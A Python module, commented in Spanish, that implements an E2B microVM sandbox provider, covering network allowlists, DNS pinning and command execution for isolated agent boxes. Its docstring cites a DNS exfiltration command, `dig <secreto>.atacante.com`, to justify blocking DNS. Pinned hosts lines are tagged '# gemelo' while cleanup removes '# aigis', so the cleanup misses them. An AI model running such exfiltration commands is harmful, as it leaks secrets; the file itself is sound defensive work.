"""Proveedor E2B (microVMs). Fase E de add-sandbox-provider.

Mapeo de red (docs.e2b.dev/sandbox/internet-access, SDK e2b 2.64.0):
  open            sin `network`: internet por defecto.
  isolated(lista) network={"allow_out": [gateway, hooks, *lista], "deny_out": ["0.0.0.0/0"],
                  "dns_servers": []}
  gateway_only    lo mismo con allow_out = gateway y hooks.
  corte en caliente  update_network(...) con la configuración COMPLETA: reemplaza, no combina.

DNS: si allow_out tiene un dominio, E2B abre 8.8.8.8 para todo tráfico y deny_out no lo
cierra. Un `dig <secreto>.atacante.com` sacaría la llave. Por eso las cajas aisladas van
con dns_servers=[]: el orquestador resuelve los hosts permitidos y los fija en /etc/hosts,
y vacía /etc/resolv.conf (si no, cada consulta tarda 20 a 40 s en fallar). Sirve porque el
filtro por dominio mira el SNI (443) o el Host (80), no la IP.

Límites que hay que respetar:
  - El filtro por dominio solo cubre HTTP en 80 y TLS en 443. El gateway y los hooks
    deben ser HTTPS en 443 (o HTTP en 80); otro puerto se filtra solo por IP.
  - En CDNs permitir un host puede habilitar otros del mismo endpoint: se permiten hosts
    exactos, nunca comodines como *.onrender.com.
  - Una conexión bloqueada puede parecer abierta: los tests miran la respuesta HTTP.

Mejora posible para D4 (no implementada, en beta): network.rules con transform.headers
inyecta el token del gateway desde los secretos de E2B, así el token nunca entra a la caja.
E2B vuelve a firmar el TLS con su CA y Claude Code necesitaría NODE_EXTRA_CA_CERTS.

Requiere E2B_API_KEY en el entorno del orquestador (nunca dentro de una caja) y la
plantilla construida con `python -m aigis.providers.e2b_template`.
"""

from __future__ import annotations

import asyncio
import os
import shlex
import socket
from collections.abc import AsyncIterator
from pathlib import PurePosixPath
from urllib.parse import urlsplit

from aigis.config import get_settings
from aigis.providers import (
    ExecEvent,
    NetworkProfile,
    ProviderError,
    QuotaExceededError,
    Sandbox,
    SandboxProvider,
    SandboxSpec,
)

TEMPLATE = os.environ.get("E2B_TEMPLATE", "aigis-sandbox")
MAX_TTL_S = int(os.environ.get("E2B_MAX_TTL_S", "3600"))  # plan Hobby: 1 h continua
PUBLIC_RESOLVER = "8.8.8.8"


def _host(url: str) -> str:
    return urlsplit(url).hostname or ""


class E2BProvider(SandboxProvider):
    name = "e2b"

    def __init__(self, template: str = TEMPLATE, api_key: str | None = None) -> None:
        s = get_settings()
        self.template = template
        self.api_key = api_key or os.environ.get("E2B_API_KEY")
        # En E2B el gateway y los hooks son URLs públicas (Render o un túnel), nunca host.docker.internal
        self.always_hosts = sorted({h for h in (_host(s.gateway_url_sandbox), _host(s.hook_base_sandbox)) if h})
        self.env_name = s.env_name
        self.boxes: dict[str, Sandbox] = {}
        self.handles: dict[str, object] = {}

    # ---------- red ----------

    def _network_opts(self, profile: NetworkProfile) -> dict | None:
        if profile.kind == "open":
            return None
        hosts = [*self.always_hosts, *sorted(profile.allowlist)]
        for h in hosts:
            if "*" in h:
                raise ProviderError(f"no se permiten comodines en la allowlist de E2B: {h}")
        return {"allow_out": hosts, "deny_out": ["0.0.0.0/0"], "dns_servers": []}

    def _update_opts(self, profile: NetworkProfile) -> dict:
        """Configuración completa para update_network: lo que no se pasa se resetea."""
        if profile.kind == "open":
            return {"allow_out": [], "deny_out": [], "dns_servers": [PUBLIC_RESOLVER]}
        return self._network_opts(profile)  # type: ignore[return-value]

    async def _resolve(self, hosts: list[str]) -> dict[str, str]:
        loop = asyncio.get_running_loop()
        out = {}
        for h in hosts:
            infos = await loop.getaddrinfo(h, 443, family=socket.AF_INET, type=socket.SOCK_STREAM)
            out[h] = infos[0][4][0]
        return out

    async def _pin_dns(self, sbx, profile: NetworkProfile) -> None:
        if profile.kind == "open":
            script = f"printf 'nameserver {PUBLIC_RESOLVER}\\n' > /etc/resolv.conf; sed -i '/# aigis$/d' /etc/hosts"
        else:
            pins = await self._resolve([*self.always_hosts, *sorted(profile.allowlist)])
            lines = "".join(f"{ip} {h} # gemelo\\n" for h, ip in pins.items())
            script = f"sed -i '/# aigis$/d' /etc/hosts; printf '{lines}' >> /etc/hosts; : > /etc/resolv.conf"
        await sbx.commands.run(script, user="root", timeout=30)

    # ---------- ciclo de vida ----------

    async def create(self, spec: SandboxSpec) -> Sandbox:
        from e2b import AsyncSandbox
        from e2b.exceptions import RateLimitException

        if not self.api_key:
            raise ProviderError("falta E2B_API_KEY en el entorno del orquestador")
        try:
            sbx = await AsyncSandbox.create(
                template=spec.template or self.template,
                timeout=min(spec.ttl_s, MAX_TTL_S),
                metadata={"run_id": spec.run_id, "lane": spec.lane, "role": spec.role, "aigis": self.env_name},
                envs=spec.env,
                network=self._network_opts(spec.network),
                api_key=self.api_key,
            )
        except RateLimitException as e:
            raise QuotaExceededError(f"E2B rechazó la caja por cuota: {e}") from e
        sb = Sandbox(id=sbx.sandbox_id, spec=spec, network=spec.network)
        self.handles[sb.id] = sbx
        try:
            # Política antes de que corra nada del agente: DNS fijado en las cajas aisladas
            if spec.network.kind != "open":
                await self._pin_dns(sbx, spec.network)
        except Exception:
            await sbx.kill()
            self.handles.pop(sb.id, None)
            raise
        self.boxes[sb.id] = sb
        return sb

    async def set_network(self, sb: Sandbox, network: NetworkProfile) -> None:
        sbx = self.handles[sb.id]
        if network.kind != "open":
            await self._pin_dns(sbx, network)  # primero sin DNS, después se cierra la red
        await sbx.update_network(self._update_opts(network))
        if network.kind == "open":
            await self._pin_dns(sbx, network)
        sb.network = network

    async def destroy(self, sb: Sandbox) -> None:
        from e2b import AsyncSandbox

        self.boxes.pop(sb.id, None)
        sbx = self.handles.pop(sb.id, None)
        try:
            if sbx is not None:
                await sbx.kill()
            else:
                await AsyncSandbox.kill(sb.id, api_key=self.api_key)
        except Exception:
            pass  # idempotente

    async def list(self, run_id: str | None = None) -> list[Sandbox]:
        from e2b import AsyncSandbox, SandboxQuery

        if not self.api_key:
            return []
        meta = {"aigis": self.env_name, **({"run_id": run_id} if run_id else {})}
        pager = AsyncSandbox.list(query=SandboxQuery(metadata=meta), api_key=self.api_key)
        res = []
        while pager.has_next:
            for info in await pager.next_items():
                known = self.boxes.get(info.sandbox_id)
                if known:
                    res.append(known)
                    continue
                m = info.metadata or {}
                spec = SandboxSpec(run_id=m.get("run_id", ""), lane=m.get("lane", ""), role=m.get("role", ""),
                                   network=NetworkProfile("isolated"))
                res.append(Sandbox(id=info.sandbox_id, spec=spec))
        return res

    # ---------- ejecución y archivos ----------

    async def exec(
        self, sb: Sandbox, cmd: list[str], *, env: dict[str, str] | None = None,
        user: str = "agent", cwd: str = "/workspace", timeout: float | None = None,
    ) -> AsyncIterator[ExecEvent]:
        sbx = self.handles[sb.id]
        q: asyncio.Queue[ExecEvent] = asyncio.Queue()
        bufs = {"stdout": "", "stderr": ""}

        def feed(stream: str):
            def cb(chunk: str) -> None:
                bufs[stream] += chunk
                *lines, bufs[stream] = bufs[stream].split("\n")
                for line in lines:
                    q.put_nowait(ExecEvent(stream, line.rstrip("\r")))  # type: ignore[arg-type]
            return cb

        handle = await sbx.commands.run(
            shlex.join(cmd), background=True, envs={**sb.spec.env, **(env or {})}, user=user, cwd=cwd,
            on_stdout=feed("stdout"), on_stderr=feed("stderr"), timeout=0,
        )
        waiter = asyncio.create_task(handle.wait())
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout if timeout else None
        finished = False
        try:
            while True:
                if waiter.done() and q.empty():
                    break
                remaining = None if deadline is None else deadline - loop.time()
                if remaining is not None and remaining <= 0:
                    raise asyncio.TimeoutError
                getter = asyncio.create_task(q.get())
                done, _ = await asyncio.wait({getter, waiter}, timeout=remaining, return_when=asyncio.FIRST_COMPLETED)
                if getter in done:
                    yield getter.result()
                else:
                    getter.cancel()
            for stream, rest in bufs.items():
                if rest:
                    yield ExecEvent(stream, rest)  # type: ignore[arg-type]
            code = 0
            try:
                result = waiter.result()
                code = result.exit_code
            except Exception as e:  # CommandExitException trae el código
                code = getattr(e, "exit_code", 1)
            yield ExecEvent("exit", str(code))
            finished = True
        finally:
            if not finished:
                try:
                    await handle.kill()
                except Exception:
                    pass
                waiter.cancel()

    async def write_files(self, sb: Sandbox, files: dict[str, bytes | str], mode: int = 0o644,
                          owner: str = "agent") -> None:
        from e2b.sandbox.filesystem.filesystem import WriteEntry

        sbx = self.handles[sb.id]
        entries = [WriteEntry(path=p, data=d if isinstance(d, bytes) else d.encode()) for p, d in files.items()]
        await sbx.files.write_files(entries, user="root")
        paths = " ".join(shlex.quote(p) for p in files)
        # Directorios intermedios con el mismo dueño (los crea write_files como root)
        parents = sorted({str(d) for p in files for d in PurePosixPath(p).parents if len(d.parts) > 2})
        dirs = " ".join(shlex.quote(d) for d in parents)
        script = f"chown {owner}:{owner} {paths} && chmod {mode:o} {paths}"
        if dirs:
            script = f"chown {owner}:{owner} {dirs} && " + script
        await sbx.commands.run(script, user="root", timeout=60)

    async def read_file(self, sb: Sandbox, path: str) -> bytes:
        return bytes(await self.handles[sb.id].files.read(path, format="bytes", user="root"))

    async def list_dir(self, sb: Sandbox, path: str) -> list[str]:
        try:
            entries = await self.handles[sb.id].files.list(path, depth=1, user="root")
        except Exception:
            return []
        return sorted(e.name for e in entries if str(getattr(e, "type", "")).endswith("file"))
